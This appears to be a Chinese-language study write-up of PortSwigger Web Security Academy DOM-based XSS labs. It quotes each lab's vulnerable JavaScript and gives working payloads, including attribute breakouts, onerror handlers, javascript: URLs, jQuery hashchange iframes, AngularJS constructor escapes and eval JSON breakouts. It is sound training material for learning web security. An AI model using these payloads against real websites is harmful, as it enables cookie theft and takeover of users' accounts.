## 利用不同源头和接收器的 DOM XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
使用搜索功能发出的请求为
GET /?search=test3 HTTP/2

在浏览器开发者工具的查看器中
搜索 document.write
得到

```javascript
function trackSearch(query) {
  //  在汇点，源被拼接到document.write的字符串中，上下文字符串为html img标签中src属性的值
  document.write(
    '<img src="/resources/images/tracker.gif?searchTerms=' + query + '">'
  );
}
//  window.location.search 获取当前URL的查询字符串部分，即从问号开始的字符串
//  URLSearchParams对象，此对象可以解析查询字符串
//  URLSearchParams对象的 get('foo') 方法，获取 'foo' 的参数值
var query = new URLSearchParams(window.location.search).get("search");
if (query) {
  trackSearch(query);
}
```

构建攻击字符串：使用"闭合 src 属性值字符串，使用>闭合 img 标签。再添加 JavaScript 内容
xss"><script>alert(1)</script>--

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element
商品详情页面的请求为
GET /product?productId=1 HTTP/2

查看商品详情页面的 JavaScript 得到

```javascript
var stores = ["London", "Paris", "Milan"];
// 源storeId存储在store变量中
var store = new URLSearchParams(window.location.search).get("storeId");
document.write('<select name="storeId">');
if (store) {
  // store拼接到html下拉列表的其中一个元素中
  document.write("<option selected>" + store + "</option>");
}
for (var i = 0; i < stores.length; i++) {
  if (stores[i] === store) {
    continue;
  }
  document.write("<option>" + stores[i] + "</option>");
}
document.write("</select>");
```

构建 url 攻击字符串:使用 JavaScript 中的源参数 storeId
1&storeId=<script>alert(1)</script>
对应 get 请求为
GET /product?productId=1&storeId=%3Cscript%3Ealert(1)%3C/script%3E HTTP/2

storeId 来源于检查库存功能中的 post 体参数
POST /product/stock HTTP/2
productId=1&storeId=Paris

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
使用搜索功能的请求为
GET /?search=test HTTP/2

响应的 JavaScript 脚本为

```javascript
function doSearchQuery(query) {
  // innerHTML 池不接受任何现代浏览器中的 script 元素，svg onload 事件也不会触发
  document.getElementById("searchMessage").innerHTML = query;
}
var query = new URLSearchParams(window.location.search).get("search");
if (query) {
  doSearchQuery(query);
}
```

构建攻击字符串：使用 img 元素，设置属性 src 的值为无效值，设置错误事件处理器
xss<img src=none onerror=alert(1)>

### 第三方依赖中的源和汇

实验：使用 jQuery 锚点 href 属性接收器及 location.search 源的 DOM XSS
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
进入提交反馈功能的页面
GET /feedback?returnPath=/ HTTP/2

```javascript
// $ 为 jQuery 库的选择器函数
// $(function ())等效于 $(document).ready()
$(function () {
  // #号 选择id为 backLink 的元素
  // attr 方法设置属性
  $("#backLink").attr(
    "href",
    new URLSearchParams(window.location.search).get("returnPath")
  );
});
```

```html
<!-- 汇所在的元素为 -->
<a id="backLink" href="/">Back</a>
```

构建攻击字符串：源为搜索 url 中 returnPath 的值，汇的上下文为 a 的 href 属性的值，使用 JavaScript 伪协议
javascript:alert(document.cookie)

实验：使用 hashchange 事件在 jQuery 选择器接收端进行 DOM XSS
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
主页请求为
GET / HTTP/2

其中 JavaScript 代码为

```javascript
// 注册 hashchange 事件处理器
$(window).on("hashchange", function () {
  // jQuery的元素选择器$()，尝试将以HTML标签开头（如#<img...>）的字符串自动创建DOM元素并执行事件属性，而非选择器查询。
  var post = $(
    "section.blog-list h2:contains(" +
      decodeURIComponent(window.location.hash.slice(1)) +
      ")"
  );
  if (post) post.get(0).scrollIntoView();
});
```

在控制服务器中构建攻击网页：
源为搜索 url 中 #号片段字符串
在 iframe 中设置 url 为源 url 与#，onload 事件处理器添加 url 自动触发 hashchange，注入脚本后被 jQuery 元素选择器解析并创建为 DOM 元素

<iframe src="https://0a6000f204c4f2608032581b00aa007b.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'">

实验：AngularJS 表达式中使用尖括号和双引号 HTML 编码的 DOM XSS
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
在 HTML 元素上使用 ng-app 属性时， 它将被 AngularJS 处理：双花括号 {{ }} 内的表达式会被实时解析为 JavaScript 代码

搜索请求头为
GET /?search=test HTTP/2

<!-- body 设置了 ng-app 属性 -->
<body ng-app="" class="ng-scope">
<!-- 而汇为 -->
<h1>0 search results for 'test'</h1>

尝试输入
{{1+1}}
返回
2

构建攻击字符串:
constructor 指向当前作用域对象（如 this）的构造函数。
constructor.constructor 实际指向 Function（所有构造函数的根构造函数）
{{ constructor.constructor('alert(1)')() }}

示例解决方案为：
对 AngularJS 作用域（$scope）的内置方法 $on 动态创建匿名函数，参数为字符串形式的函数体。并立即调用。
{{$on.constructor('alert(1)')()}}

第一种为当前对象的构造函数的构造函数 -> Function
第二种为$on 方法（函数）的构造函数 -> Function
回溯到根构造函数，使用字符串作为函数体构建匿名函数，再立即调用

## 结合反射型和存储型的 DOM XSS

实验：反射型 DOM XSS
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

搜索请求头为
GET /search-results?search=foobartest HTTP/2
响应为 json 格式
{"results":[],"searchTerm":"foobartest"}
源为 json 中 searchTerm 的值

```javascript
// path 的值为 'search-results'
function search(path) {
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      // 将响应json拼接到变量 searchResultsObj的值中
      eval("var searchResultsObj = " + this.responseText);
      displaySearchResults(searchResultsObj);
    }
  };
  xhr.open("GET", path + window.location.search);
  xhr.send();
  // ··· 省略剩余代码
}

<script>search('search-results')</script>;
```

响应的 JavaScript 中 this.responseText 为
'{"results":[],"searchTerm":"foobartest"}'

json 响应转义引号。但反斜杠没有被转义
构建攻击字符串：使用 }; 结束对象作用域与语句，在 eval 中执行另一条脚本 alert(1)
\"};alert(1)//
单独看此响应时浏览器报错为 json 解析异常。但响应内容仍被基本页面接受

示例解决方案：与对象的值的字符串使用 -号 进行字符串运算，于是 alert(1)将被计算
\"-alert(1)}//

第一种为关闭字符串再关闭对象，使用语句分隔符后作为另一条语句执行。
第二种为关闭字符串后通过 -号 调用函数进行字符串运算，再关闭对象。

实验：存储型 DOM XSS
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored
在评论功能中
GET /post/comment?postId=3 HTTP/2
POST /post/comment HTTP/2

csrf=yFUCZ1i1oEtW1AMBNIXLxyul9xoQ7XjN&postId=3&comment=test&name=a&email=a%40a&website=
得到响应

```json
[
  // ··· 省略数据
  {
    "avatar": "",
    "website": "",
    "date": "2025-10-12T09:13:43.280982004Z",
    "body": "test",
    "author": "a"
  }
]
```

```javascript
function loadComments(postCommentPath) {
  let xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      // 使用安全的 JSON.parse 对字符串进行处理
      let comments = JSON.parse(this.responseText);
      displayComments(comments);
    }
  };
  xhr.open("GET", postCommentPath + window.location.search);
  xhr.send();

  // HTML转义函数仅对<>尖括号进行 【一次】 转义
  function escapeHTML(html) {
    return html.replace("<", "&lt;").replace(">", "&gt;");
  }

  // 源作为参数comments 进入 displayComments函数
  function displayComments(comments) {
    let userComments = document.getElementById("user-comments");

    for (let i = 0; i < comments.length; ++i) {
      comment = comments[i];
      let commentSection = document.createElement("section");
      commentSection.setAttribute("class", "comment");

      let firstPElement = document.createElement("p");

      if (comment.author) {
        if (comment.website) {
          let websiteElement = document.createElement("a");
          websiteElement.setAttribute("id", "author");
          websiteElement.setAttribute("href", comment.website);
          firstPElement.appendChild(websiteElement);
        }

        let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author);
        firstPElement.innerHTML = newInnerHtml;
      }

      if (comment.body) {
        let commentBodyPElement = document.createElement("p");
        commentBodyPElement.innerHTML = escapeHTML(comment.body);

        commentSection.appendChild(commentBodyPElement);
      }
      commentSection.appendChild(document.createElement("p"));

      userComments.appendChild(commentSection);
    }
  }
}

<script>loadComments('/post/comment')</script>;
```

根据上下文，分为在字符串中需结束字符串，以及在文本段中需添加尖括号
对于 setAttribute 此处服务器返回的内容均对各引号进行转义，且 website 检查是否以 http: 开头，似乎无注入点
对于 innerHTML 此处的转义仅对尖括号进行一次转义，注入点在 author 或 body
示例解决方案：
<><img src=1 onerror=alert(1)>
